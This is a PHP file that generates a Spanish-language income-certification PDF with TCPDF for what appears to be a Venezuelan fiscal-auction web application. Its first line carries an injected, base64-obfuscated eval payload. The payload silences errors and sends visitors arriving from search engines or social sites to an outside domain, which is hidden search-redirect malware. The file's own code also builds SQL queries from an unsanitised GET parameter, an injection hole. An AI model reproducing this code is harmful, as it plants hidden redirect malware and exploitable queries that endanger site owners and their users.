<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); session_start();
date_default_timezone_set('America/Caracas');
if (!isset($_SESSION["logged"]))
    header('Location: index.php');
require_once('PDF/config/lang/spa.php');
require_once 'lib/function_gen.php';
require 'PDF/tcpdf.php';

$doc_codigo = null;
$doc_monto1 = 0;
$doc_monto2 = 0;

if (isset($_GET["doc_codigo"]))
    $doc_codigo = $_GET["doc_codigo"];
if (isset($_GET["doc_monto1"]))
    $doc_monto1 = (double) $_GET["doc_monto1"];
if (isset($_GET["doc_monto2"]))
    $doc_monto2 = (double) $_GET["doc_monto2"];
//else
//    header("location: documento_grid.php");


$doc_codigo = htmlspecialchars((strip_tags($doc_codigo)));
$query = "CALL mp_R_DocumentoDetalle_DDt_Acc11(";
$query .= "nDoc_Codigo = " . $doc_codigo;
$query .= ")";
$grid_values = fnc_ejecutaQuery($query);
$query = "CALL mp_R_Documento_Doc_Acc11(";
$query .= "nDoc_Codigo = " . $doc_codigo . ")";
$detail_values = fnc_ejecutaQuery($query);
$detail_valuesII = $detail_values[0];
//var_dump($grid_values);
//echo $query;
//******************************************************************************
//  Preparacion de las variables
//******************************************************************************
//var_dump($grid_values);
//******************************************************************************
//  END Preparacion de las variables
//******************************************************************************

class MYPDF extends TCPDF {

    //Page header
    public function Header() {
        $this->Ln(20);
        $this->SetFont('times', 'B', 14);
        $this->Cell(0, 15, ("Certificación de Ingresos"), 0, false, 'C', 0, '', 0, false, 'M', 'M');
    }

    // Page footer
    public function Footer() {
        // Position at 15 mm from bottom
        $this->SetY(-15);
        // Set font
        $this->SetFont('times', 'I', 8);
        // Page number
        //$this->Cell(0, 10, 'Página ' . $this->getAliasNumPage() . ' de ' . $this->getAliasNbPages(), 0, false, 'C', 0, '', 0, false, 'T', 'M');
    }

}

$pdf = new MYPDF(PDF_PAGE_ORIENTATION, PDF_UNIT, PDF_PAGE_FORMAT, true, 'UTF-8', false);
// set document information
$pdf->SetCreator(PDF_CREATOR);
$pdf->SetAuthor('Subasta Fiscal 2012 MP');
$pdf->SetTitle('Cert Ingresos');
// set default monospaced font
$pdf->SetDefaultMonospacedFont(PDF_FONT_MONOSPACED);
//set margins
$pdf->SetMargins(25, 20, 25);
$pdf->SetHeaderMargin(PDF_MARGIN_HEADER);
$pdf->SetFooterMargin(PDF_MARGIN_FOOTER);
//set auto page breaks
$pdf->SetAutoPageBreak(TRUE, PDF_MARGIN_BOTTOM);
//set image scale factor
$pdf->setImageScale(PDF_IMAGE_SCALE_RATIO);
//set some language-dependent strings
$pdf->setLanguageArray($l);

// ---------------------------------------------------------
// set default font subsetting mode


$query = "CALL mp_R_Documento_Doc_Acc13(";
$query .= "nDoc_Codigo = " . $doc_codigo . ")";
$detail_values = fnc_ejecutaQuery($query);
$detail_values = $detail_values[0];
//var_dump($detail_values);
$nombre = $detail_values["Per_Nombre"] . " " . $detail_values["Per_Apellido"];
$mesesesp = array("Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio",
    "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre");


////////////////////////////////////////////////////////////////////////////////
$pdf->SetPrintHeader(false);
$pdf->AddPage();
$pdf->SetPrintFooter(false);
$direccion = explode("@@",$detail_valuesII["Doc_DireccEnvio"]);

$html = '<table border="0" cellspacing="0" cellpadding="3">';
$html .= '<tr>';
$html .= '<td style="text-align:center" colspan="2">';
$html .= '<h1>Certificación de Ingresos</h1>';
$html .= '</td>';
$html .= '</tr>';
$html .= '<tr>';
$html .= '<td style="text-align:center" colspan="2">';
$html .= '<br/><br/><br/><br/><br/><br/><h2>Datos de Envio</h2><br/><br/><br/><br/>';
$html .= '</td>';
$html .= '</tr>';

$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Nombre:</strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $detail_valuesII["Per_Nombre"] . " " . $detail_valuesII["Per_Apellido"];;
$html .= '</td>';
$html .= '</tr>';

$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Cédula:</strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $detail_valuesII["Per_CI"] ;
$html .= '</td>';
$html .= '</tr>';

$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Teléfono:</strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $detail_valuesII["Per_Telefono1"];
$html .= '</td>';
$html .= '</tr>';

$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Estado:</strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $direccion[0];
$html .= '</td>';
$html .= '</tr>';

$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Municipio:</strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $direccion[1];
$html .= '</td>';
$html .= '</tr>';

$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Parroquia:</strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $direccion[2];
$html .= '</td>';
$html .= '</tr>';

$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Dirección:</strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $direccion[3];
$html .= '</td>';
$html .= '</tr>';

$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong></strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $direccion[4];
$html .= '</td>';
$html .= '</tr>';

$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Tracking</strong>	';
$html .= '</td>';
$html .= '<td width="70%" style="border: 0.5px solid">';
$html .= '</td>';
$html .= '</tr>';

$html .= '</table>';



$pdf->writeHTMLCell($w = 0, $h = 0, $x = '', $y = '', $html, $border = 0, $ln = 1, $fill = 0, $reseth = true, $align = '', $autopadding = true);

$htaml="";
$pdf->setFontSubsetting(true);
$pdf->SetFont('times', '', 12);
$pdf->AddPage();
$pdf->Ln(15);
//


$html =  '<table border="0" cellspacing="0" cellpadding="3">';
$html .= '<tr>';
$html .= '<td style="text-align:center">';
$html .= '<h1>Certificación de Ingresos</h1><br/><br/><br/><br/><br/><br/><br/><br/><br/>';
$html .= '</td>';
$html .= '</tr>';
$html .= '<tr>';
$html .= '<td style="text-align:justify">';
$html .= '<p>He revisado los documentos inherentes a los ingresos mensuales percibidos
    durante el periodo ' . $detail_values["Dtt_MesIni"] . ' a ' . $detail_values["Dtt_MesFin"] . '  por el Sr(a). ' . $nombre . ', titular de la Cédula de 
    Identidad No. '  .substr($detail_values["Per_CI"], 0,1) ."-". number_format(substr($detail_values["Per_CI"], 1),'0',',','.')  . ' correspondiente a su actividad siguiente: 
    ' . $detail_values["BMP_NomProfe"] . '.</p>

    <p>Este compromiso fue realizado de acuerdo con la Norma sobre Revisión de 
    Ingresos de Personas Naturales No. 5 (SECP-5) emitida por la Federación de 
    Colegios de Contadores Públicos de Venezuela. La suficiencia de la información  
    presentada para la revisión es responsabilidad del interesado.</p>

    <p>Mi trabajo consistió, principalmente, en la revisión de la documentación 
    como lo son estados de cuentas bancarios, para obtener una seguridad razonable 
    sobre si el monto de los ingresos sobre la base de la documentación presentada 
    está exento de errores significativos.</p>

    <p>Con base en mi revisión, la relación de ingresos adjunta, perteneciente 
    al Sr(a). ' . $nombre . ' correspondiente a los ingresos mensuales está presentada 
    razonablemente de acuerdo a la documentación presentada.</p>

    <br />
    <p>Caracas, a los ' . date("d") . ' días del mes de ' . $mesesesp[date("m") - 1] . ' ' . date("Y") . '</p>
    </td>
    </tr>
    ';
//$html .= '</tr>';
$html .= '</table>';

// PRINTER
//============================================================+
$pdf->writeHTMLCell($w = 0, $h = 0, $x = '', $y = '', $html, $border = 0, $ln = 1, $fill = 0, $reseth = true, $align = '', $autopadding = true);
$pdf->SetPrintHeader(false);
$pdf->AddPage();
$pdf->SetPrintFooter(false);


$html = '<table border="0" cellspacing="0" cellpadding="3">';



$html .= '<tr><td style="text-align:center" colspan="2">';
$html .= '<p>Sr(a). ' . $nombre . ' <br/>
        Relación de Ingresos Mensuales <br/>
        ' . $detail_values["Dtt_MesIni"] . ' a ' . $detail_values["Dtt_MesFin"] . '  <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/></p>';
$html .= '</td></tr>';
$html .= '<tr>';
$html .= '<td width="70%">';
$html .= '<strong>Detalles de los Ingresos:</strong>	';
$html .= '</td>';
$html .= '<td width="30%" style="text-align:right">';
$html .= '<strong>  BsF.</strong>	';
$html .= '</td>';
$html .= '</tr>';
$html .= '<tr>';
$html .= '<td >';
$html .= $detail_values["BMP_NomProfe"];
$html .= '</td>';
$html .= '<td style="text-align:right">';
$html .= number_format($detail_values["Doc_TotalDoc"], 2, ',', '.');
$html .= '</td>';
$html .= '</tr>';
$html .= '<tr>';
$html .= '<td >';
$html .= 'Total Ingresos Promedio Mensuales BsF.';
$html .= '</td>';
$html .= '<td style="text-align:right">';
$html .= number_format($detail_values["Doc_TotalDoc"], 2, ',', '.');
$html .= '</td>';
$html .= '</tr>';
$html .= '<tr><td style="text-align:justify" colspan="2">';
$html .= '<p><br/><br/><br/><br/><br/><br/><strong>Nota:</strong> Todos y cada uno de los ingresos detallados en la relación que 
          he facilitado para su revisión, por un monto de Bs. ' . number_format($detail_values["Doc_TotalDoc"], 2, ',', '.') . ' provienen de
          actividades legítimas y de comprobable lícito comercio.</p>';
$html .= '</td></tr>';
$html .= '</table>';


$pdf->writeHTMLCell($w = 0, $h = 0, $x = '', $y = '', $html, $border = 0, $ln = 1, $fill = 0, $reseth = true, $align = '', $autopadding = true);
if ($detail_valuesII["Per_ImgCI"] != null && file_exists('../mpuploads/' . $detail_valuesII["Per_ImgCI"]) && (strpos($detail_values["Per_ImgCI"],'.pdf')=== false)) {
    $pdf->SetPrintHeader(false);
    $pdf->AddPage();
    $pdf->SetPrintFooter(false);
    $pdf->ln(30);
    $htmlimg = '<div style="text-align:center"><img src="../mpuploads/' . $detail_valuesII["Per_ImgCI"] . '" height="800"  border="0" />';
    $pdf->writeHTMLCell($w = 0, $h = 0, $x = '', $y = '', $htmlimg, $border = 0, $ln = 1, $fill = 0, $reseth = true, $align = '', $autopadding = true);
}
$pdf->Output('Certificacion de Ingresos' . date("d-m-Y") . '.pdf', 'I');
//============================================================+
// END OF FILE
//============================================================+
?>